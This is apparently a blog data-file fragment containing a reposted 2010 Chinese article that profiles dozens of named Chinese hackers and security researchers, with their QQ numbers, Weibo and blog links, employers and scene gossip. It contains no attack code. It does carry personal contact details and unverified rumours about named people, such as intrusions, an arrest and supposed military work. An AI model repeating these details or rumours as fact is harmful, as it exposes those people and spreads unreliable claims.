/>脚本，数据库，渗透方面的高手。目前就职于腾讯QQ公司。<br /><br />neeao<br />QQ:35789112<br />WEB应用安全及脚本方面的高手。<br /><br />u#0h4x0r<br />博客:<a target=\"_blank\" href=\"http://www.noahacker.com/\" rel=\"noopener noreferrer\">http://www.noahacker.com/</a><br />QQ:645041992<br />对JAVA有一定了解，对渗透也有一些研究。入侵过不少无辜网站。<br /><br />hmily<br />qq:68857640<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Hmily_LCG\" rel=\"noopener noreferrer\">http://t.qq.com/Hmily_LCG</a><br />博客:<br />吾爱破解的BOSS。是程序破解，软件破解，加密解密，逆向工程方面的高手。破解过很多大家常用的工具，如穿山甲。<br /><br />xi4oyu<br />博客:<a target=\"_blank\" href=\"http://www.pentestday.com/\" rel=\"noopener noreferrer\">http://www.pentestday.com/</a> &amp; <br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evil_xi4oyu\" rel=\"noopener noreferrer\">http://t.qq.com/evil_xi4oyu</a><br />qq:909473606<br />linux方面的高手。<br /><br />猪猪<br />QQ:82648 &amp; 100298<br />岁月联盟站长。入行也有几年了。曾经参加过爱国反击黑客战。也入侵过不少圈内的同行网站。对ASP，注入方面比较了解。<br /><br />rayh4c<br />qq:30039780<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/rayh4c\" rel=\"noopener noreferrer\">http://t.qq.com/rayh4c</a><br />茄子宝。80SEC核心成员。对xss，CSRF等脚本漏洞非常精通。经验丰富。<br /><br />superhei<br />QQ:123230273<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hi_heige\" rel=\"noopener noreferrer\">http://t.qq.com/hi_heige</a><br />幻影旅团核心成员。曾经写过著名的php注入漏洞利用工具。发现过很多国内流行的php程序漏洞。是WEB脚本，数据库方面的专家。<br /><br />ring04h<br />QQ:153520368<br />博客:<br />EST核心成员。与国内顶级黑客sunwear关系甚好。曾一同入侵过国内最著名的两大PHP论坛。此人对php，数据库等方面相当精通。<br /><br />冰血封情<br />QQ:310926<br />博客:<a target=\"_blank\" href=\"http://weblog.eviloctal.com/\" rel=\"noopener noreferrer\">http://weblog.eviloctal.com/</a><br />EST创始人。传说中的中国第四代黑客。据传说已经自己开公司，很久不做技术了。<br /><br />冰的原点<br />QQ:519249638<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/icezone\" rel=\"noopener noreferrer\">http://t.qq.com/icezone</a><br />黑客手册常见的人。是入门级黑客书籍《黑客渗透笔记》的原作者。对于初学者来说还是有一定学习价值的。<br /><br />friddy<br />博客:<a target=\"_blank\" href=\"http://www.friddy.cn/\" rel=\"noopener noreferrer\">http://www.friddy.cn</a><br />QQ:568623<br />专门搞漏洞挖掘的人，虽然技术上跟最上面的那些大牛级黑客比差一些，但相对来说还是不错的。另外也对入侵检测有所研究。<br /><br />余弦<br />qq:331861985<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evilcos\" rel=\"noopener noreferrer\">http://t.qq.com/evilcos</a><br />xeye成员。目前就职于icbm的知道创宇公司，是web，脚本等方面的高手。<br /><br />教主<br />QQ:130138438<br />网站:<a target=\"_blank\" href=\"http://www.jiaozhu.org/\" rel=\"noopener noreferrer\">www.jiaozhu.org</a><br />圈内名气还算比较大的，主要还是因为他刷库赚钱很多。并且赔的也比较快。呵呵。技术不怎么样，但很能买很能卖。<br /><br />剑心<br />QQ:369458956<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/nullnull\" rel=\"noopener noreferrer\">http://t.qq.com/nullnull</a><br />方小顿。80sec站长。目前就职于百度公司，曾经跟百度公司老板李彦宏一起参加过芒果台的娱乐节目，一曲成名。不久前因为发布nginx的漏洞而又一次成名，是WEB安全，应用安全方面的高手。<br /><br />陆羽<br />QQ:170093007<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/T00ls_Luyu\" rel=\"noopener noreferrer\">http://t.qq.com/T00ls_Luyu</a><br />博客:<a target=\"_blank\" href=\"http://www.5luyu.cn/\" rel=\"noopener noreferrer\">http://www.5luyu.cn</a><br />t00ls核心成员，曾经编写过不少注入，旁注方面的辅助入侵工具，例如t00ls内部旁注工具，GETWEBSHELL等等。目前就职于奇虎360公司。<br /><br />爱无言<br />QQ:348450419<br />EST核心成员。对于漏洞挖掘，溢出利用，网络脚本安全方面有着多年经验。在国内著名黑客杂志黑客防线上发表过上百篇的文章。<br /><br />樱花浪子<br />QQ:305446947<br />博客:<a target=\"_blank\" href=\"http://www.hacklu.net/\" rel=\"noopener noreferrer\">http://www.hacklu.net/</a><br />SQL注入，WEB应用渗透技术还行。在一些黑客杂志上有过一些技术类文章。<br /><br />h4k_b4n<br />QQ:616222<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/h4k_b4n\" rel=\"noopener noreferrer\">http://t.qq.com/h4k_b4n</a><br />BCT核心成员。是WEB安全，脚本，数据库安全方面的高手，曾经发现过很多著名程序的漏洞。<br /><br />pt007<br />QQ:7491805<br />彭涛。就职于国内著名信息安全公司，启明星辰。是ISTO的创始人。对oracle,mysql等数据库已经php等脚本非常精通。有多年的开发维护测试等安全经验。著名的xp/2k/2k3完美克隆用户的程序就是他的杰作。<br /><br />majun<br />QQ:45539511<br />马俊。据说是个很能装的人。不过还是有点技术，另外还传说他是sunwear的徒弟。可能得到的真传0day有不少。那入侵网站就如鱼得水了。<br /><br />shadow<br />QQ:26727179<br />博客:<br />影子。渗透高手。perl等脚本方面的高手。<br /><br />xiaomi<br />QQ:5980740<br />小米。T00ls的创始人之一。人缘还是不错的。<br /><br />cnbird<br />QQ:441303228<br />博客:<a target=\"_blank\" href=\"http://blog.csdn.net/cnbird2008\" rel=\"noopener noreferrer\">http://blog.csdn.net/cnbi\nrd2008</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cnbird2008\" rel=\"noopener noreferrer\">http://t.qq.com/cnbird2008</a><br />如果大家经常看国内的黑客杂志肯定对这个不陌生。linux,windows全方面的渗透高手。有一定的入侵经验。<br /><br />hackest<br />QQ:297521327<br />博客:<a target=\"_blank\" href=\"http://www.hackest.cn/\" rel=\"noopener noreferrer\">http://www.hackest.cn/</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hackest\" rel=\"noopener noreferrer\">http://t.qq.com/hackest</a><br />也是搞入侵渗透的。不久前一直在卖LMHASH,MD5的彩虹表。<br /><br />惘然<br />博客:<a target=\"_blank\" href=\"http://www.wangran.net/\" rel=\"noopener noreferrer\">http://www.wangran.net/</a><br />搞渗透的<br /><br />4ngel<br />博客:<a target=\"_blank\" href=\"http://www.sablog.net/blog/\" rel=\"noopener noreferrer\">http://www.sablog.net/blog/</a><br />sablog的作者。著名的安全天使站长，现在广为流行的几个WEBSHELL都是他写的，有些是从他大代码上改的。对WEBSHELL行业有着不可磨灭的贡献，也是早期很多PHP程序漏洞的发现者。<br /><br />xhacker<br />QQ:66680800<br />小叮当。据说当年入侵过绿盟，也是混迹于黑客圈很久的人了。搞渗透不错。<br /><br />冷漠<br />QQ:386817<br />博客:fhod<a target=\"_blank\" href=\"http://www.lengmo.net/\" rel=\"noopener noreferrer\">http://www.lengmo.net/</a><br />红狼联盟的创始人。目前好像跟着某前辈黑客做事。<br /><br />fhod<br />QQ:1988415<br />博客:<a target=\"_blank\" href=\"http://0day.kr/\" rel=\"noopener noreferrer\">http://0day.kr/</a><br />目前好像跟着EST的老大打工。在渗透入侵方面也是有一定经验的，曾经写过一些文章。后来还因为黑站被抓。<br /><br />冰sugar<br />博客:<a target=\"_blank\" href=\"http://sebug.cn/\" rel=\"noopener noreferrer\">http://sebug.cn/</a><br />朱巨源。写过入门级的文章。在X档案有过投稿。也写过书《黑客攻防实战入门》。对一般的渗透技术有一定了解。<br /><br />虫子<br />QQ:712663200<br />博客:<a target=\"_blank\" href=\"http://evilh4ck.blog.sohu.com/\" rel=\"noopener noreferrer\">http://evilh4ck.blog.sohu.com/</a><br />虫总据说是入侵过不少游戏官方网站。看来应该赚了些钱。此人对入侵攻击还是有很多了解的。<br /><br />amxking<br />博客:<a target=\"_blank\" href=\"http://amxking.bokee.com/\" rel=\"noopener noreferrer\">http://amxking.bokee.com</a><br />QQ:5711277<br />红狼的核心成员，也是天阳的管理。<br /><br />七剑<br />QQ:7259561<br />博客:<a target=\"_blank\" href=\"http://1v1.name/\" rel=\"noopener noreferrer\">http://1v1.name</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/qijian\" rel=\"noopener noreferrer\">http://t.qq.com/qijian</a><br />搞WEB脚本，数据库，渗透攻击的。<br /><br />啊D<br />QQ:9269563<br />网站:<a target=\"_blank\" href=\"http://www.d99net.net/\" rel=\"noopener noreferrer\">http://www.d99net.net/</a><br />入行时间不短了，写过一些比较出名的工具，如早期的啊D网络工具包和后来的啊D注入工具。从这些可以看出对注入，编程是有一定了解的。经验比较丰富，工具虽然有BUG但还算稳定。<br /><br />雨夜<br />QQ:9148357<br />博客:<br />混迹黑客全也有数年。技术凑合。曾经也开办过黑客网站。<br /><br />redbin<br />QQ:35475<br />网站:<a target=\"_blank\" href=\"http://www.vip8.org/\" rel=\"noopener noreferrer\">http://www.vip8.org/</a><br />红滨。校园黑客联盟站长。<br />","source":"_posts/2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解.md","raw":"title: 2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解\ncategories: [网络安全]\ntags: []\ndate: 2010-10-10 20:41:00\n---\n2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解文章作者：<br />信息来源：邪恶八进制信息安全团队(<a target=\"_blank\" href=\"http://www.eviloctal.com/\" rel=\"noopener noreferrer\">www.eviloctal.com</a>)<br />百晓生_民间杂志【民间交流 民间技术 民间文化 民间舆论】<br />我只是在写自己所想到的杂志 我只是菜鸟！<br /><br />主页博客相册|个人档案 |好友 <br />查看文章&#160; &#160; <br /><br />【转帖】2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br />2010年10月06日 星期三 下午 08:06<br />强大的黑客，强大的资料，以后就跟着这榜单混了，呵呵！<br /><br />郑重声明：<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />！！！！！！！！！！！！！！！！！！！！！！<br /><br />——————————————————————————————————————————<br /><br />祝各位大牛国庆节快乐.<br /><br />本文足以轰动一下.各大网站编辑抓紧第一时间发布<br /><br />2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br /><br />首先最主要注明的是：排名不分先后<br /><br />本名单第一部分罗列的黑客都是真正拥有技术和才能者。并非大多数人平时在电视中所看到的那些盗号或入侵网站的“黑客”，电视里报道的那些人只是黑客界最底 层的人。例如熊猫烧香的作者，其实技术并不高，在黑客圈中大多数人都只是把这个病毒当作一个玩具。而技术含量高超的病毒都是类似于29A发布的那种。<br /><br />本文作者自我介绍。毕业于哈尔滨工业大学，2001年出道黑客圈，曾在国内多个黑客论坛潜水多年。参加过2004年国内顶级黑客大会XCON（安全焦点峰 会）（PS:扯淡）。2003年就职过国际顶级搜索引擎公司GOOGLE，后因个人原因离职。在黑客界有一定人缘基础。所以本文有一定权威性。至于我是 谁，避免被人追杀还是不明说了。下面开始正文：<br />第一部分列举老牌黑客。中国黑客界早期技术很牛的人。都是真正的高手。现在大部分技术还是不减当年，数一数二，是普通人望尘莫及的。<br /><br />在下面这些人中很多人手握众多危害极大的未公开漏洞。就是圈内所称的0day。这类危害极大的0day一般在黑市上可以卖的数十万人民币。<br />本文原始发布地址: <a target=\"_blank\" href=\"https://docs.google.com/leaf?id=1rO9CxzojOO0Qho-VOIUpGjwfZhAqcuRWnVXAbluCk4I&amp;sort=name&amp;layout=list&amp;num=50\" rel=\"noopener noreferrer\">https://docs.google.com/leaf?id= ... out=list&amp;num=50</a><br />一切内容以上面博客原文为准<br />注：以下列举的黑客当然只是一部分，其实还有很多的前辈级黑客。只不过现在基本都告别技术行业了。下面的人物中大部分还在相关领域活动，所以优先列出了。<br /><br />sunwear<br />QQ:47347<br />微博: <a target=\"_blank\" href=\"http://t.qq.com/sunwe4r\" rel=\"noopener noreferrer\">http://t.qq.com/sunwe4r</a><br />博客: 好像不用了<br />日娃哥。EST核心成员。圈内皆知他手握很多未公开漏洞。渗透入侵和漏洞方面的高手，曾是编程内核牛人。曾经入侵过世界顶级黑客组织Metasploit，剑桥大学等众多高端机构。几年前的世界最顶级两大黑客大会defcon和blackhat都对他有过报道。<br /><br />刺 QQ:32750912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/aullik5\" rel=\"noopener noreferrer\">http://t.qq.com/aullik5</a><br />博客:<br />刺哥，大风哥。身材瘦弱。是中国黑客圈内纯技术黑客组织幻影旅团创始人。中国顶级黑客之一。目前好像就职于淘宝公司网络安全部门。也是手握很多未公开漏洞 的人。很多影响力很大的0day都是出自幻影旅团。WebZine的发起人。并且发展过WIKI的系统。还曾远赴美国参加世界顶级黑客大会 blackhat。。<br /><br />dm<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/zoeluk\" rel=\"noopener noreferrer\">http://t.qq.com/zoeluk</a><br />博客:<br />国内顶级地下黑客组织0x557核心成员。是漏洞挖掘，利用方面的高手。不用说，手里的漏洞也是多的可以批发了。目前就职于世界著名反病毒杀毒软件公司麦咖啡(刚刚被intel收购)。现在还写起了iphone,ipad下的安全软件。看来是个全能选手。<br /><br />flashsky<br />QQ:38062 &amp; 16202253<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/flash-sky\" rel=\"noopener noreferrer\">http://t.qq.com/flash-sky</a><br />方兴。闪空哥。国内著名黑客组织安全焦点核心成员。2003年WINDOWS历史上最严重安全漏洞细节全球首发者,数百个高危级安全漏洞发现者,历任启明 星辰,美国EEYE,美国微软特聘安全专家,美国微软BLUEHAT第一个中国演讲者,安全焦点成员,南京翰海源信息技术有限公司创始人和CEO。对漏洞 方面的研究是相当高深的。预祝公司发展顺利。<br /><br />tombkeeper<br />QQ:644909<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tombkeeper\" rel=\"noopener noreferrer\">http://t.qq.com/tombkeeper</a><br />于某。传说中的tk教主。国内著名黑客组织安全焦点核心成员。就职于绿盟科技，俗称妇科圣手。对windows操作系统以及漏洞等方面的研究可以说是非常精通。而在安全焦点论坛，最近几年一直被人奉为TK教主。对于其他领域的科学也有着独到的见解。文笔思想也是很独特的。<br /><br />glacier<br />QQ:1973435<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/glacier\" rel=\"noopener noreferrer\">http://t.qq.com/glacier</a><br />黄鑫。冰河哥。黄总。同为国内著名的黑客组织安全焦点核心成员。深圳大成天下的创始人之一。是中国最早的远程控制木马&quot;冰河&quot;的作者，也是著名安全扫描工 具&quot;x-scan&quot;的作者。黑客编程方面的高手，对于网络协议，加密安全以及软件工程有很深的了解。女黑客wollf的老公。一个风趣幽默的人。从微博上 就可以看出来了。已经当父亲了，当然孩子不是木马，是一个帅哥。再此祝福一下。<br /><br />swan<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Swan557\" rel=\"noopener noreferrer\">http://t.qq.com/Swan557</a><br />0x557(SST)核心成员，对于linux,windows操作系统上的漏洞可谓了如指掌。<br /><br />goodwell<br />QQ:19558287<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/goodwell\" rel=\"noopener noreferrer\">http://t.qq.com/goodwell</a><br />龚蔚。安致信息技术有限公司。中国早起黑客组织绿色兵团创始人，是传说中的中国黑客教父。曾经接受过中央电视台的参访。是以为资深的魔兽世界玩家。<br /><br />xundi<br />QQ:518860<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/idnuxzhang\" rel=\"noopener noreferrer\">http://t.qq.com/idnuxzhang</a><br />张迅迪。国内早期的著名黑客组织安全焦点创始人。具体就不过多介绍了，因为不熟悉，哈哈。<br /><br />lion<br />QQ:21509<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/coollion\" rel=\"noopener noreferrer\">http://t.qq.com/coollion</a><br />林勇。中国红客联盟创始人。跟大多网民在网上所了解到的中国红客大联盟不同。这个才是真正的中国红客联盟。至于所谓的sharpwinner，我只能用一句文明用语敏感词来形容“SB”“草泥马”。现在对于技术不如当年，而且已经远离技术告别当初了。<br /><br />isno<br />QQ:1070681<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/isnoblah\" rel=\"noopener noreferrer\">http://t.qq.com/isnoblah</a><br />安全焦点核心成员之一。目前就职于北京中航嘉信公司。曾经写过很多漏洞溢出方面的分析利用文章（WEBDAV,IDQ,IDA等）。exploit也写过很多。现在较为低调。<br /><br />天行<br />QQ:911189<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tian_xing\n\" rel=\"noopener noreferrer\">http://t.qq.com/tian_xing</a> 好像不怎么用<br />中国第一代黑客之一。在1999年曾经与发动对国外网站的攻击。网络刺客,网络卫兵是其代表作品。而他对溢出和漏洞利用也颇有研究，例如RPC漏洞利用程序。以及他写的后门都很好。<br /><br />quack<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wulujia\" rel=\"noopener noreferrer\">http://t.qq.com/wulujia</a><br />吴鲁佳。深圳达成天下创始人。与中国木马之父黄鑫关系很好。安全焦点早期活跃之人，ID：quack。<br /><br />icbm<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/icbmx2\" rel=\"noopener noreferrer\">http://t.qq.com/icbmx2</a> 基本不用<br />赵伟。知道创宇创始人之一。曾经就职于国内著名信息安全公司启明星辰积极防御实验室。对各操作系统以及第三方软件的漏洞有很深的了解，手下的未公开漏洞很多。包括基于web方面的一些独特漏洞。<br /><br />sowhat<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/secsecsec\" rel=\"noopener noreferrer\">http://t.qq.com/secsecsec</a><br />薛峰。就职于某保密单位。曾赴美国参加过国际顶级黑客大会blackhat。手握很多未公开漏洞。好像今年中国顶级黑客盛会xcon上还抽奖中了一台PS3。<br /><br />vxk<br />QQ:86879759<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cvcvxk\" rel=\"noopener noreferrer\">http://t.qq.com/cvcvxk</a><br />几年前活跃于国内著名病毒论坛CVC。是国内知名的病毒专家。对操作系统内核以及编程，逆向，破解非常精通。可谓程序全能专家。<br /><br />refdom<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/refdom\" rel=\"noopener noreferrer\">http://t.qq.com/refdom</a><br />安全焦点核心成员之一。曾经是中国红客联盟的一员。<br /><br />watercloud<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/watercloud\" rel=\"noopener noreferrer\">http://t.qq.com/watercloud</a><br />知道创宇公司创始人之一。与icbm关系甚好。安全焦点核心成员之一。对漏洞，加密解密等方面有者多年的研究经验，网络安全趋势与发展有着独到的见解。最主要的还是对漏洞，0day方面，手握0day数量也很客观。<br /><br />alert7<br />QQ:415451<br />博客:<br />安全焦点核心成员之一。曾经就职与著名杀毒软件MCAFEE。目前就职于南京翰海源(Flashsky的公司)。对linux 方面的研究经验长达10年以上。对于linux等开源系统漏洞溢出分析利用了如指掌。<br /><br />袁哥<br />博客:<br />传说中的袁哥。没错，中国所有圈内顶级黑客无不佩服的人。就只与绿盟科技。袁哥在数学，编程，漏洞等诸多方面的造诣是无人可以比拟的。很多漏洞要早其它人数年之久就已经发现并且完美利用了。堪称漏洞方面的其人。黑客界的顶级高手。<br /><br />sunx<br />QQ:239670<br />孙华。国内非常著名的黑客编程高手，对漏洞溢出与利用和有研究，写过EXPLOIT。例如IDA漏洞和printer。在9X年代用汇编写过病毒。并且还编写过操作系统后门程序。<br /><br />funnywei<br />QQ:25044885<br />魏强。F博士。安全焦点核心成员之一。漏洞挖掘，漏洞利用方面的高手，在历届国内顶级黑客盛会XCON上都能见到他的身影。据传就职于中国人民解放军XXX部。为中国人民解放军提供很多未公开漏洞。<br /><br />小榕<br />中国早期著名黑客软件“流光”“逆雪”“乱刀”“黑客字典生成器”“ARPSNIFFER”“命令行注入工具”等黑客软件作者。目前对于漏洞方面等技术不如以上几人。不过对于中国黑客界的贡献还是不可小觑的。<br /><br />xikug<br />QQ:53564797<br />国内著名内核，漏洞，程序研究站debugman的站长。逆向，破解，加密，解密，内核等方面的高人。<br /><br />baoz<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/perlish\" rel=\"noopener noreferrer\">http://t.qq.com/perlish</a><br />方勇。包子。fatb。多年前就活跃于中国黑客界。活跃程度和人缘还是不错的。目前就职与迅雷公司。有大牛曾说是个带眼镜的胖子。为人厚道，皮肤较黑。<br /><br />wzt<br />QQ:71579912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wztjlh\" rel=\"noopener noreferrer\">http://t.qq.com/wztjlh</a><br />曾经的中国红客联盟核心成员。对于linux内核，以及linux漏洞方面颇有研究。<br /><br />czy<br />QQ:484323<br />四川的一个著名黑客，比较低调，但地下交流圈子中交流频繁。手握很多0day的高手。<br /><br />zzzevazzz<br />QQ:49322630<br />博客:<a target=\"_blank\" href=\"http://zzzevazzz.bokee.com/\" rel=\"noopener noreferrer\">http://zzzevazzz.bokee.com/</a><br />国内著名黑客组织幻影旅团核心成员。早期混迹于灰色轨迹。曾经著名的do all in cmdshell  作者。曾经在安全焦点普及ntsd知识，红极一时。对于windows内核以及漏洞方面有着深入的了解和经验。曾经写过很多有利于大众的文章，分享过很多 宝贵的经验。<br /><br />vessial<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/vessial\" rel=\"noopener noreferrer\">http://t.qq.com/vessial</a><br />同dm一样就职于国际顶级杀毒软件安全厂商麦咖啡公司。也是一位对于漏洞等方面有诸多经验的高手。<br /><br />bkbll<br />qq:78384349<br />dumplogon。BK哥。中国红客联盟核心成员之一。2001年中美黑客大战时期技术还是初级的，但也算早期了。后来对溢出，漏洞以及逆向分析方面颇有研究，技术不错。是lion的好朋友。<br /><br />killer<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/dongzhiqiang\" rel=\"noopener noreferrer\">http://t.qq.com/dongzhiqiang</a><br />博客:<br />董志强。安全焦点核心成员之一。曾经就只与启明星辰公司。对于病毒与防病毒，逆向工程与破解等方面有多年的研究经验。目前为著名安全产品超级巡警的BOSS。<br /><br />coolq<br />qq:49462335<br />就职于绿盟科技的linux方面高手。在绿盟期刊上曾发有著作。对于开源系统有着多年的应用开发经验。linux,unix,bsd内核方面以及漏洞挖掘，利用方面也有着多年的经验。<br /><br />pjf<br />qq:85863144<br />博客:<a target=\"_blank\" href=\"http://pjf.blogcn.com/\" rel=\"noopener noreferrer\">http://pjf.blogcn.com/</a><br />国内著名antirootkit工具icesword的作者。是内核方面的专家。国内著名安全软件公司奇虎360公司的核心开发人员。<br /><br />lcx<br />海洋顶端网站长，是国内渗透入侵方面的高手，有着多年的入侵经验。是中国网马教父之一。安全手册的顾问。<br /><br />村长<br />QQ:6021240<br />国内顶级黑客组织0x557(SST)创始人。是国内著名信息安全公司启明星辰积极防御实验室的BOSS。对windows,linux非常了解，拥有多年的漏洞挖掘，利用的经验。<br /><br />casper<br />QQ:843525<br />华永兴安BOSS。国内顶级黑客大会xcon的主办方，也是安全焦点创始人之一。中国黑客界的老前辈。目前已经脱离技术领域，向老板发展了。<br /><br />e4gle<br />QQ:1949479<br />国内著名黑客组织WSS核心成员。老一代的黑客。对linux,unix下的溢出漏洞分析以及利用有着多年的研究经验，并且对病毒也很了解。<br />--------------------华丽的分割线----------------------<br /><br />下面将列举一些新生力量，虽然是新生，但起码都是3-6年前左右就开始活跃的人，所以还算是中生代黑客。<br /><br />mj0011<br />QQ:保密，避免骂他的人太多。<br />博客:<br />就职于国内著名安全公司奇虎360。为核心工程师。圈内敌人无数，只因口无遮拦，相貌丑陋等缺点所导致。对瑞星，金山等公司曾经常出言讽刺，另外连国际顶 级安全厂商赛门铁克也不放过。可谓毒舌娘子，连我也被骂过好几次。话说回来，对于编程，内核，木马，远控方面的技术还是不可否定的。<br /><br />baiyuanfan<br />QQ:51449276<br />曾经著名的后门程序BYSHELL的作者。曾经在某界安全焦点峰会上有过演讲议题，技术还是不错的。<br /><br />zwell<br />QQ:27592430<br />网站:<a target=\"_blank\" href=\"http:/\n/www.nosec.org/\" rel=\"noopener noreferrer\">http://www.nosec.org</a><br />白远方。曾经NB联盟核心成员。现在为诺塞科技的老大。诺塞科技的产品现在也广为圈内所知，例如穿山甲，JSKY等工具。对编程和注入WEB方面的东西也是很精通的。<br /><br />sudami<br />qq:527463097<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/sudami\" rel=\"noopener noreferrer\">http://t.qq.com/sudami</a><br />博客:<br />目前就职于国内著名杀毒软件安全软件厂商奇虎360公司。是后起的windows编程，内核之秀。对渗透攻击，入侵方面技术基本为零。曾在邪恶八进制，DEBUGMAN等论坛发表过多篇原创文章。对技术很有追求，进步很快的一个牛人。<br /><br />oldjun<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/seuhacker\" rel=\"noopener noreferrer\">http://t.qq.com/seuhacker</a><br />博客:<a target=\"_blank\" href=\"http://www.oldjun.com/\" rel=\"noopener noreferrer\">http://www.oldjun.com/</a><br />QQ:34680304<br />t00ls核心成员。asp,php等WEB脚本方面的高手，对于渗透入侵，WEB渗透相当精通。<br /><br />9xiao<br />博客: &amp; <a target=\"_blank\" href=\"http://www.9xiao.net/\" rel=\"noopener noreferrer\">www.9xiao.net</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/deioncube\" rel=\"noopener noreferrer\">http://t.qq.com/deioncube</a><br />t00ls核心成员，原火狐联盟的人。<br /><br />aono<br />QQ:13335589<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/air-storm\" rel=\"noopener noreferrer\">http://t.qq.com/air-storm</a><br />t00ls核心成员。无线安全方面的高手。在无线网络安方面有其独特的技术思想和经验。<br /><br />云舒<br />QQ:21287305<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/yunshuy\" rel=\"noopener noreferrer\">http://t.qq.com/yunshuy</a><br />是幻影旅团的核心成员之一，目前同axis一同就职于淘宝公司。其实也算的上是一位比较有资历的老人了。应该位列在上面。写过synflood方面代码。<br /><br />明小子<br />QQ:830540<br />网站:<a target=\"_blank\" href=\"http://www.hackdiy.com/\" rel=\"noopener noreferrer\">http://www.hackdiy.com/</a><br />黑客动画吧的人。著名的明小子旁注工具domain的作者。相比很多菜鸟都以及享受过这个工具的实惠了。其实技术只能说是一般。不过入行也不久了。注入脚本以及简易的编程还是不错的。<br /><br />鬼仔<br />QQ:359421<br />博客:<a target=\"_blank\" href=\"http://huaidan.org/\" rel=\"noopener noreferrer\">http://huaidan.org</a><br />目前就职于新浪公司。WEB应用安全方面的高手。<br /><br />lake2<br />QQ:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />脚本，数据库，渗透方面的高手。目前就职于腾讯QQ公司。<br /><br />neeao<br />QQ:35789112<br />WEB应用安全及脚本方面的高手。<br /><br />u#0h4x0r<br />博客:<a target=\"_blank\" href=\"http://www.noahacker.com/\" rel=\"noopener noreferrer\">http://www.noahacker.com/</a><br />QQ:645041992<br />对JAVA有一定了解，对渗透也有一些研究。入侵过不少无辜网站。<br /><br />hmily<br />qq:68857640<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Hmily_LCG\" rel=\"noopener noreferrer\">http://t.qq.com/Hmily_LCG</a><br />博客:<br />吾爱破解的BOSS。是程序破解，软件破解，加密解密，逆向工程方面的高手。破解过很多大家常用的工具，如穿山甲。<br /><br />xi4oyu<br />博客:<a target=\"_blank\" href=\"http://www.pentestday.com/\" rel=\"noopener noreferrer\">http://www.pentestday.com/</a> &amp; <br />微博:<a target=\"_blank\" href=\"http://t.qq.com/evil_xi4oyu\" rel=\"noopener noreferrer\">http://t.qq.com/evil_xi4oyu</a><br />qq:909473606<br />linux方面的高手。<br /><br />猪猪<br />QQ:82648 &amp; 100298<br />岁月联盟站长。入行也有几年了。曾经参加过爱国反击黑客战。也入侵过不少圈内的同行网站。对ASP，注入方面比较了解。<br /><br />rayh4c<br />qq:30039780<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/rayh4c\" rel=\"noopener noreferrer\">http://t.qq.com/rayh4c</a><br />茄子宝。80SEC核心成员。对xss，CSRF等脚本漏洞非常精通。经验丰富。<br /><br />superhei<br />QQ:123230273<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/hi_heige\" rel=\"noopener noreferrer\">http://t.qq.com/hi_heige</a><br />幻影旅团核心成员。曾经写过著名的php注入漏洞利用工具。发现过很多国内流行的php程序漏洞。是WEB脚本，数据库方面的专家。<br /><br />ring04h<br />QQ:153520368<br />博客:<br />EST核心成员。与国内顶级黑客sunwear关系甚好。曾一同入侵过国内最著名的两大PHP论坛。此人对php，数据库等方面相当精通。<br /><br />冰血封情<br />QQ:310926<br />博客:<a target=\"_blank\" href=\"http://weblog.eviloctal.com/\" rel=\"noopener noreferrer\">http://weblog.eviloctal.com/</a><br />EST创始人。传说中的中国第四代黑客。据传说已经自己开公司，很久不做技术了。<br /><br />冰的原点<br />QQ:519249638<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/icezone\" rel=\"noopener noreferrer\">http://t.qq.com/icezone</a><br />黑客手册常见的人。是入门级黑客书籍《黑客渗透笔记》的原作者。对于初学者来说还是有一定学习价值的。<br /><br />friddy<br />博客:<a 